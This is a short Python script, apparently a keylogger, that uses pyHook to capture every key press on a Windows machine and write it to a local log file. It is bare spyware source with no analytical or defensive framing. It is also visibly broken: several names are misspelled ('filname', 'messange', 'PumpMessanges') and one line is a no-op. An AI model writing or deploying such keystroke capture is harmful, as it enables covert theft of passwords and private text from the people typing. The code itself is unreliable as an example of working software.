import pyHook, pythoncom, sys, logging

# Temporary logile 
logfile = 'c:\\log\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filname=logfile, level=logging.DEBUG, format='%(messange)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

managehook = pyHook.HookManager()
managehook.KeyDown = OnKeyboardEvent
managehook.HookKeyboard()

# Waiting forever
pythoncom.PumpMessanges()
